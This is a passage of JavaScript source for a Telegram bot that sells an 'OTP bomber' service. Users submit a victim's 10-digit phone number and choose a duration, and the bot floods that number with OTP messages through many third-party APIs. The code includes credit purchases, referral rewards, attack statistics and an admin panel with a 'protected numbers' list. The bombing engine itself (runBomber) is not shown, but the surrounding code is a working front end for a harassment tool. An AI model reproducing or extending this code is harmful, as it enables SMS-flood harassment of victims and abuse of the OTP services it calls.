        ['🟢 START BOMB', '🔴 STOP BOMB'], ['💰 MY CREDITS', '🎁 DAILY SPIN'],
        ['🎟️ REDEEM CODE', '👑 ADMIN PANEL'], ['📊 MY STATS', '❓ HELP'],
        ['💳 BUY CREDITS', '🔗 REFERRAL'], ['⚙️ SETTINGS']
    ], resize_keyboard: true }};
}

function adminKeyboard() {
    return { reply_markup: { keyboard: [
        ['📊 STATS', '👥 USERS LIST'], ['🎟️ GEN CODE', '🚫 BAN USER'],
        ['✅ UNBAN USER', '💰 ADD CREDITS'], ['➕ ADD PROTECTED', '➖ REMOVE PROTECTED'],
        ['📋 PROTECTED LIST', '📢 BROADCAST'], ['📋 ALL USERS', '🔄 UNLIMITED PLAN'],
        ['📺 CHANNEL MANAGER', '🛡️ SCANNER MANAGER'], ['📸 SET QR CODE', '💳 PAYMENT APPROVAL'],
        ['🔙 BACK']
    ], resize_keyboard: true }};
}

// ============================================================
// ===== CHANNEL =====
// ============================================================
async function getChannelButtons() {
    const channels = await db.getChannels();
    const buttons = channels.map(ch => [{ text: `✅ ${ch}`, url: `https://t.me/${ch.replace('@','')}` }]);
    buttons.push([{ text: '🟢 Joined All', callback_data: 'verify_join' }]);
    return { inline_keyboard: buttons };
}

// ============================================================
// ===== PAYMENT =====
// ============================================================
const PAYMENT_PLANS = {
    '10': { credits: 10, price: 20, label: '10 Credits – ₹20' },
    '25': { credits: 25, price: 40, label: '25 Credits – ₹40' },
    '50': { credits: 50, price: 70, label: '50 Credits – ₹70' },
    '100': { credits: 100, price: 120, label: '100 Credits – ₹120' },
    'unlimited': { credits: 0, price: 150, label: '⭐ 1 Day Unlimited – ₹150' }
};

async function handleBuyCredits(chatId, planKey) {
    const plan = PAYMENT_PLANS[planKey];
    if (!plan) return bot.sendMessage(chatId, '❌ Invalid plan!');
    if (!qrCodeSet) return bot.sendMessage(chatId, '❌ QR not set. Contact admin.');

    try {
        await bot.sendPhoto(chatId, qrCodePath, { caption: `💳 **${plan.label}**\n\n1️⃣ Scan QR\n2️⃣ Pay ₹${plan.price}\n3️⃣ Send screenshot`, parse_mode: 'Markdown' });
        const payId = Math.random().toString(36).substring(2, 10);
        pendingPayments.set(chatId, { ...plan, payId, status: 'pending' });
        userStates.set(chatId, { state: 'payment_screenshot', plan: planKey, payId });
    } catch (e) { bot.sendMessage(chatId, '❌ Error sending QR.'); }
}

async function handlePaymentScreenshot(chatId, msg) {
    const state = userStates.get(chatId);
    if (!state || state.state !== 'payment_screenshot' || !msg.photo) return;
    const plan = PAYMENT_PLANS[state.plan];
    const payId = state.payId;
    const photo = msg.photo[msg.photo.length - 1];

    pendingScreenshots.set(payId, { userId: chatId, username: msg.from.username || '', first_name: msg.from.first_name || '', plan: state.plan, credits: plan.credits, price: plan.price, fileId: photo.file_id, status: 'pending' });

    const kb = { inline_keyboard: [[{ text: '✅ Approve', callback_data: `approve_pay_${payId}` }, { text: '❌ Reject', callback_data: `reject_pay_${payId}` }]] };
    for (const aid of ADMIN_IDS) {
        try { await bot.sendPhoto(aid, photo.file_id, { caption: `📸 Payment\n👤 ${msg.from.first_name}\n💰 ₹${plan.price}\n🆔 ${payId}`, reply_markup: kb }); } catch (e) {}
    }
    bot.sendMessage(chatId, '✅ Screenshot sent! Wait for approval.');
    userStates.delete(chatId);
}

async function handleSetQRCode(chatId, msg) {
    if (!ADMIN_IDS.includes(Number(chatId))) return;
    if (!msg.photo) return bot.sendMessage(chatId, '📸 Send QR photo.');
    try {
        const photo = msg.photo[msg.photo.length - 1];
        const file = await bot.getFile(photo.file_id);
        const url = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
        const res = await axios({ url, responseType: 'stream', timeout: 30000 });
        res.data.pipe(fs.createWriteStream(qrCodePath));
        qrCodeSet = true;
        bot.sendMessage(chatId, '✅ QR saved!');
        userStates.delete(chatId);
    } catch (e) { bot.sendMessage(chatId, `❌ ${e.message}`); }
}

// ============================================================
// ===== BROADCAST =====
// ============================================================
async function handleBroadcast(chatId, msg) {
    const users = await db.User.find().select('_id');
    if (!users.length) return bot.sendMessage(chatId, '❌ No users.');
    const pm = await bot.sendMessage(chatId, `📢 Broadcasting to ${users.length}...`, { parse_mode: 'Markdown' });

    let type = 'text', media = null, cap = msg.caption || '', txt = msg.text || '';
    if (msg.photo) { type = 'photo'; media = msg.photo[msg.photo.length-1].file_id; }
    else if (msg.video) { type = 'video'; media = msg.video.file_id; }
    else if (msg.document) { type = 'document'; media = msg.document.file_id; }
    else if (msg.animation) { type = 'animation'; media = msg.animation.file_id; }
    else if (msg.sticker) { type = 'sticker'; media = msg.sticker.file_id; }

    let ok = 0, fail = 0;
    for (let i = 0; i < users.length; i++) {
        try {
            if (type === 'text') await bot.sendMessage(users[i]._id, `📢 ${txt}`, { parse_mode: 'Markdown' });
            else if (type === 'photo') await bot.sendPhoto(users[i]._id, media, { caption: cap });
            else if (type === 'video') await bot.sendVideo(users[i]._id, media, { caption: cap });
            else if (type === 'document') await bot.sendDocument(users[i]._id, media, { caption: cap });
            else if (type === 'animation') await bot.sendAnimation(users[i]._id, media, { caption: cap });
            else if (type === 'sticker') await bot.sendSticker(users[i]._id, media);
            ok++;
        } catch (e) { fail++; }
        if ((i+1) % 20 === 0 || i === users.length-1) {
            try { await bot.editMessageText(`📢 ${i+1}/${users.length} | ✅${ok} ❌${fail}`, { chat_id: chatId, message_id: pm.message_id }); } catch (e) {}
        }
        await new Promise(r => setTimeout(r, 30));
    }
    await bot.editMessageText(`✅ Done! ✅${ok} ❌${fail}`, { chat_id: chatId, message_id: pm.message_id });
    adminBroadcastState.delete(chatId);
}

// ============================================================
// ===== COMMANDS =====
// ============================================================
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    if (await db.isBanned(chatId)) return bot.sendMessage(chatId, '🚫 Banned!');
    const user = await db.getUser(chatId);
    user.username = msg.from.username || '';
    user.first_name = msg.from.first_name || '';
    await user.save();
    const ref = msg.text.split(' ')[1];
    if (ref) { user.pending_ref_code = ref; await user.save(); }

    const joined = await db.isJoined(chatId, bot);
    if (!joined) {
        const ch = await db.getChannels();
        if (ch.length) return bot.sendMessage(chatId, `🚫 Join:\n${ch.join('\n')}`, { reply_markup: await getChannelButtons() });
    }
    await showMainMenu(chatId);
});

async function showMainMenu(chatId) {
    const user = await db.getUser(chatId);
    if (user.pending_ref_code) {
        const r = await db.processReferral(chatId, user.pending_ref_code);
        bot.sendMessage(chatId, r.success ? `🎉 ${r.msg}` : `❌ ${r.msg}`);
        user.pending_ref_code = null;
        await user.save();
    }
    const code = await db.generateReferralCode(chatId);
    const info = await bot.getMe();
    bot.sendMessage(chatId, `👋 Welcome!\n🔗 Code: \`${code}\`\n📤 \`https://t.me/${info.username}?start=${code}\``, { parse_mode: 'Markdown', ...mainKeyboard() });
}

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    if (await db.isBanned(chatId)) return;
    const user = await db.getUser(chatId);

    if (adminBroadcastState.has(chatId) && ADMIN_IDS.includes(Number(chatId))) {
        if (text === '/cancel' || text === 'Cancel') { adminBroadcastState.delete(chatId); return bot.sendMessage(chatId, '❌ Cancelled.'); }
        return handleBroadcast(chatId, msg);
    }

    const state = userStates.get(chatId);
    if (state && state.state === 'payment_screenshot' && msg.photo) return handlePaymentScreenshot(chatId, msg);
    if (state && state.state === 'set_qr' && msg.photo) return handleSetQRCode(chatId, msg);

    if (text === '📸 SET QR CODE') { if (!ADMIN_IDS.includes(Number(chatId))) return; userStates.set(chatId, { state: 'set_qr' }); return bot.sendMessage(chatId, '📸 Send QR photo.'); }
    if (text === '💳 PAYMENT APPROVAL') {
        if (!ADMIN_IDS.includes(Number(chatId))) return;
        const p = Array.from(pendingScreenshots.values()).filter(x => x.status === 'pending');
        if (!p.length) return bot.sendMessage(chatId, '📭 None.');
        bot.sendMessage(chatId, p.map(x => `👤 ${x.first_name} | 💰 ₹${x.price} | 🆔 ${x.payId}`).join('\n'));
        return;
    }
    if (text === '💳 BUY CREDITS') return bot.sendMessage(chatId, '💳 Plan:', { reply_markup: { inline_keyboard: [ [{text:'10 Credits – ₹20',callback_data:'buy_10'}],[{text:'25 Credits – ₹40',callback_data:'buy_25'}],[{text:'50 Credits – ₹70',callback_data:'buy_50'}],[{text:'100 Credits – ₹120',callback_data:'buy_100'}],[{text:'⭐ 1 Day – ₹150',callback_data:'buy_unlimited'}] ] } });
    if (text === '💰 MY CREDITS') { const ul = user.daily_unlimited > Date.now()/1000; return bot.sendMessage(chatId, `💰 Credits: ${user.credits}${ul?'\n⭐ Unlimited Active!':''}`); }
    if (text === '🎁 DAILY SPIN') {
        const now = Date.now()/1000;
        if (user.last_daily > now-86400) return bot.sendMessage(chatId, `⏳ Try in ${Math.ceil((user.last_daily+86400-now)/60)}m`);
        const reward = Math.floor(Math.random()*10)+1;
        await db.updateCredits(chatId, reward);
        user.last_daily = now; await user.save();
        return bot.sendMessage(chatId, `🎉 +${reward} credits!`);
    }
    if (text === '🎟️ REDEEM CODE') { userStates.set(chatId, { state: 'redeem_code' }); return bot.sendMessage(chatId, '🎟️ Send code:'); }
    if (text === '🔗 REFERRAL') {
        const code = await db.generateReferralCode(chatId);
        const info = await bot.getMe();
        const ref = await db.getReferralData(chatId);
        return bot.sendMessage(chatId, `🔗 Code: \`${code}\`\n👥 ${ref.count||0} referred\n💰 ${(ref.count||0)*5} earned\n📤 \`https://t.me/${info.username}?start=${code}\``, { parse_mode: 'Markdown' });
    }
    if (text === '📊 MY STATS') {
        const s = user.bomb_sessions || [];
        return bot.sendMessage(chatId, `📊 Attacks: ${user.total_attacks||0}\n📬 OTPs: ${s.reduce((a,b)=>a+(b.total_sent||0),0)}\n📈 Sessions: ${s.length}`);
    }
    if (text === '❓ HELP') return bot.sendMessage(chatId, `🤖 /bomb | /stop | /credits | /daily | /redeem | /referral | /buy\n🚀 ${allApis.length} APIs\n📞 5 APIs/batch = 20 calls/cycle`);
    if (text === '⚙️ SETTINGS') return bot.sendMessage(chatId, '⚙️ Settings', { reply_markup: { inline_keyboard: [[{text:'📋 View',callback_data:'settings_view'}]] } });
    if (text === '👑 ADMIN PANEL') { if (!ADMIN_IDS.includes(Number(chatId))) return bot.sendMessage(chatId, '❌'); return bot.sendMessage(chatId, '🔐 Admin', adminKeyboard()); }
    if (text === '🔙 BACK') return bot.sendMessage(chatId, '🔙 Menu', mainKeyboard());
    if (text.includes('START BOMB')) {
        if (bombingStatus.get(chatId)) return bot.sendMessage(chatId, '❌ Active.');
        if (!await db.isJoined(chatId, bot)) { const ch = await db.getChannels(); return bot.sendMessage(chatId, `🚫 Join:\n${ch.join('\n')}`); }
        userStates.set(chatId, { state: 'enter_phone' });
        return bot.sendMessage(chatId, '📱 Send 10-digit number:');
    }
    if (text === '🔴 STOP BOMB') { if (bombingStatus.get(chatId)) { bombingStatus.set(chatId, false); return bot.sendMessage(chatId, '⏹️ Stopped.'); } return bot.sendMessage(chatId, '❌ No active.'); }

    if (ADMIN_IDS.includes(Number(chatId))) {
        if (text === '📊 STATS') { const tu = await db.User.countDocuments(); const ta = (await db.User.aggregate([{$group:{_id:null,total:{$sum:'$total_attacks'}}}]))[0]?.total||0; return bot.sendMessage(chatId, `👥 ${tu} | ⚔️ ${ta} | 📡 ${allApis.length}`); }
        if (text === '👥 USERS LIST') { const u = await db.User.find().limit(20); return bot.sendMessage(chatId, u.map(x=>`🆔${x._id} | 💰${x.credits}`).join('\n')); }
        if (text === '🎟️ GEN CODE') { userStates.set(chatId, { state: 'gen_code' }); return bot.sendMessage(chatId, '💰 Amount (max 1000):'); }
        if (text === '🚫 BAN USER') { userStates.set(chatId, { state: 'ban_user' }); return bot.sendMessage(chatId, '🚫 User ID:'); }
        if (text === '✅ UNBAN USER') { userStates.set(chatId, { state: 'unban_user' }); return bot.sendMessage(chatId, '✅ User ID:'); }
        if (text === '💰 ADD CREDITS') { userStates.set(chatId, { state: 'add_credits' }); return bot.sendMessage(chatId, '💰 User ID:'); }
        if (text === '➕ ADD PROTECTED') { userStates.set(chatId, { state: 'add_protected' }); return bot.sendMessage(chatId, '🛡️ Number:'); }
        if (text === '➖ REMOVE PROTECTED') { userStates.set(chatId, { state: 'remove_protected' }); return bot.sendMessage(chatId, '❌ Number:'); }
        if (text === '📋 PROTECTED LIST') { const l = await db.getProtected(); return bot.sendMessage(chatId, l.length?l.join('\n'):'None'); }
        if (text === '📢 BROADCAST') { adminBroadcastState.set(chatId, { active: true }); return bot.sendMessage(chatId, '📢 Send message to broadcast.\n/cancel to exit.', { reply_markup: { inline_keyboard: [[{text:'❌ Cancel',callback_data:'smart_broadcast_cancel'}]] } }); }
        if (text === '📋 ALL USERS') { const u = await db.User.find(); return bot.sendMessage(chatId, u.map(x=>`🆔${x._id}`).join('\n')); }
        if (text === '🔄 UNLIMITED PLAN') { userStates.set(chatId, { state: 'unlimited_plan' }); return bot.sendMessage(chatId, '⭐ User ID:'); }
        if (text === '📺 CHANNEL MANAGER') return bot.sendMessage(chatId, '📺', { reply_markup: { inline_keyboard: [[{text:'➕ Add',callback_data:'channel_add'},{text:'➖ Remove',callback_data:'channel_remove'},{text:'📋 View',callback_data:'channel_view'}]] } });
    }

    if (state) {
        const inp = text.trim();
        if (state.state === 'redeem_code') { const amt = await db.getRedeemCode(inp.toUpperCase()); if (amt === null) bot.sendMessage(chatId, '❌ Invalid.'); else { await db.updateCredits(chatId, amt); bot.sendMessage(chatId, `✅ +${amt}`); } return userStates.delete(chatId); }
        if (state.state === 'enter_phone') { const ph = inp.replace(/\D/g,''); if (ph.length !== 10) return bot.sendMessage(chatId, '❌ 10 digits.'); userStates.set(chatId, { phone: ph }); return bot.sendMessage(chatId, `📱 ${ph}\n⏱️ Duration:`, { reply_markup: { inline_keyboard: [[{text:'1m (1💰)',callback_data:'dur_1'},{text:'2m (2💰)',callback_data:'dur_2'},{text:'3m (3💰)',callback_data:'dur_3'}],[{text:'5m (5💰)',callback_data:'dur_5'},{text:'10m (10💰)',callback_data:'dur_10'},{text:'30m (10💰)',callback_data:'dur_30'}],[{text:'60m (10💰)',callback_data:'dur_60'},{text:'⭐ 1Day (100💰)',callback_data:'dur_1440'}]] }}); }
        if (state.state === 'gen_code') { const a = parseInt(inp); if (isNaN(a)||a<1||a>1000) return; const c = 'RTF'+Math.random().toString(36).substring(2,7).toUpperCase(); await db.createRedeemCode(c,a); bot.sendMessage(chatId, `✅ ${c} = ${a}`); return userStates.delete(chatId); }
        if (state.state === 'ban_user') { await db.banUser(parseInt(inp)); bot.sendMessage(chatId, '✅'); return userStates.delete(chatId); }
        if (state.state === 'unban_user') { await db.unbanUser(parseInt(inp)); bot.sendMessage(chatId, '✅'); return userStates.delete(chatId); }
        if (state.state === 'add_credits') { userStates.set(chatId, { state: 'add_credits_amount', uid: parseInt(inp) }); return bot.sendMessage(chatId, '💰 Amount:'); }
        if (state.state === 'add_credits_amount') { await db.updateCredits(state.uid, parseInt(inp)); bot.sendMessage(chatId, '✅'); return userStates.delete(chatId); }
        if (state.state === 'add_protected') { if (!inp.match(/^\d{10}$/)) return; await db.addProtected(inp); bot.sendMessage(chatId, '✅'); return userStates.delete(chatId); }
        if (state.state === 'remove_protected') { if (!inp.match(/^\d{10}$/)) return; await db.removeProtected(inp); bot.sendMessage(chatId, '✅'); return userStates.delete(chatId); }
        if (state.state === 'unlimited_plan') { const t = await db.getUser(parseInt(inp)); t.daily_unlimited = Date.now()/1000+86400; await t.save(); bot.sendMessage(chatId, '✅'); try { bot.sendMessage(parseInt(inp), '⭐ Unlimited activated!'); } catch(e) {} return userStates.delete(chatId); }
    }
});

bot.on('callback_query', async (q) => {
    const chatId = q.message.chat.id, data = q.data, msgId = q.message.message_id;
    if (data === 'verify_join') { if (await db.isJoined(chatId, bot)) { bot.editMessageText('✅ Granted!', { chat_id: chatId, message_id: msgId }); await showMainMenu(chatId); } else bot.answerCallbackQuery(q.id, { text: '❌ Not joined.', show_alert: true }); return; }
    if (data.startsWith('dur_')) { const dur = parseInt(data.split('_')[1]); const st = userStates.get(chatId); if (st?.phone) { const ph = st.phone; userStates.delete(chatId); await runBomber(chatId, ph, dur); } else bot.sendMessage(chatId, '❌ Enter number first.'); return bot.answerCallbackQuery(q.id); }
    if (data.startsWith('buy_')) { await handleBuyCredits(chatId, data.replace('buy_','')); return bot.answerCallbackQuery(q.id); }
    if (data.startsWith('approve_pay_')) { if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(q.id, { text: '⛔', show_alert: true }); const payId = data.replace('approve_pay_',''); const p = pendingScreenshots.get(payId); if (!p) return bot.editMessageText('❌ Not found.', { chat_id: chatId, message_id: msgId }); if (p.credits > 0) await db.updateCredits(p.userId, p.credits); else { const u = await db.getUser(p.userId); u.daily_unlimited = Date.now()/1000+86400; await u.save(); } try { await bot.sendMessage(p.userId, '🎉 Approved!'); } catch(e) {} bot.editMessageText('✅ Approved', { chat_id: chatId, message_id: msgId }); pendingScreenshots.delete(payId); return bot.answerCallbackQuery(q.id); }
    if (data.startsWith('reject_pay_')) { const payId = data.replace('reject_pay_',''); const p = pendingScreenshots.get(payId); if (p) { try { await bot.sendMessage(p.userId, '❌ Rejected.'); } catch(e) {} pendingScreenshots.delete(payId); } bot.editMessageText('❌ Rejected', { chat_id: chatId, message_id: msgId }); return bot.answerCallbackQuery(q.id); }
    if (data === 'smart_broadcast_cancel') { adminBroadcastState.delete(chatId); bot.editMessageText('❌ Cancelled', { chat_id: chatId, message_id: msgId }); return bot.answerCallbackQuery(q.id); }
    if (data === 'channel_view') { const ch = await db.getChannels(); bot.editMessageText(ch.length?ch.join('\n'):'None', { chat_id: chatId, message_id: msgId }); return bot.answerCallbackQuery(q.id); }
});

// ============================================================
// ===== HEALTH SERVER =====
// ============================================================
const express = require('express');
const app = express();
const port = process.env.PORT || 10000;

app.get('/health', (req, res) => res.json({ status: 'ok', apis: allApis.length, activeBombing: bombingStatus.size }));
app.get('/', (req, res) => res.send('🤖 Bot Running!'));
app.listen(port, '0.0.0.0', () => console.log(`✅ Server on ${port}`));

console.log(`🚀 Bot Started! ${allApis.length} APIs | 5 APIs/batch | 20 calls/cycle to target`);
